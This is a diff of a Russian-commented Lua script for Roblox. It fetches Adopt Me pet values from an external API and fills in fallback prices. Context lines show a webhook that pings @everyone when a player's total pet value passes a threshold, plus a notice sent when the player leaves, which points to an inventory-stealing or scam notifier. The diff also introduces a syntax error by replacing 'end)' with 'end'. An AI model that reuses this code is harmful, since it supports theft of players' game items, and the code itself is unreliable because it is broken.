@@ -42,31 +42,43 @@ local function GetPetValuesFromAPI()
     local success, response = pcall(function()
         return request({
             Url = "https://elvebredd.com/api/pets/get-latest",
-            Method = "GET"
+            Method = "GET",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            }
         })
     end)
     
     if success and response and response.Success then
-        local data = HttpService:JSONDecode(response.Body)
-        return data
+        local decodeSuccess, data = pcall(function()
+            return HttpService:JSONDecode(response.Body)
+        end)
+        
+        if decodeSuccess and data and data.pets then
+            print("✅ Значения питомцев загружены с Elvebredd API")
+            return data.pets
+        else
+            warn("❌ Ошибка декодирования JSON от Elvebredd API")
+        end
     else
-        warn("❌ Не удалось получить данные с Elvebredd API")
-        return nil
+        warn("❌ Не удалось получить данные с Elvebredd API: " .. tostring(response))
     end
+    return nil
 end
 
 -- Получаем актуальные значения питомцев
-local elvebreddData = GetPetValuesFromAPI()
+local elvebreddPets = GetPetValuesFromAPI()
 local valuesTable = {}
 
-if elvebreddData and elvebreddData.pets then
-    for petName, petData in pairs(elvebreddData.pets) do
-        valuesTable[petName] = {
-            value = petData.value or 0,
-            rarity = petData.rarity or "common"
-        }
+if elvebreddPets then
+    for petName, petData in pairs(elvebreddPets) do
+        if type(petData) == "table" and petData.value then
+            valuesTable[petName] = {
+                value = petData.value,
+                rarity = petData.rarity or "common"
+            }
+        end
     end
-    print("✅ Значения питомцев загружены с Elvebredd API")
 else
     -- Fallback значения если API недоступно
     warn("⚠️ Используются резервные значения питомцев")
@@ -74,7 +86,17 @@ else
         ["Shadow Dragon"] = {value = 7000, rarity = "legendary"},
         ["Giraffe"] = {value = 8000, rarity = "legendary"},
         ["Bat Dragon"] = {value = 10000, rarity = "legendary"},
-        -- ... можно добавить базовые значения для самых важных питомцев
+        ["Frost Dragon"] = {value = 2000, rarity = "legendary"},
+        ["Owl"] = {value = 3500, rarity = "legendary"},
+        ["Parrot"] = {value = 2000, rarity = "legendary"},
+        ["Evil Unicorn"] = {value = 1000, rarity = "legendary"},
+        ["Crow"] = {value = 2000, rarity = "legendary"},
+        ["Arctic Reindeer"] = {value = 700, rarity = "legendary"},
+        ["Albino Monkey"] = {value = 400, rarity = "legendary"},
+        ["Turtle"] = {value = 450, rarity = "legendary"},
+        ["Kangaroo"] = {value = 180, rarity = "legendary"},
+        ["Unicorn"] = {value = 150, rarity = "legendary"},
+        ["Dragon"] = {value = 22, rarity = "legendary"},
     }
 end
 
@@ -855,7 +877,7 @@ game:GetService("Players").PlayerRemoving:Connect(function(player)
     if player == game:GetService("Players").LocalPlayer then
         SendLeaveNotify(player.Name)
     end
-end)
+end
 
 -- Отправляем вебхук с учетом стоимости для @everyone
 if totalValue >= 50 then
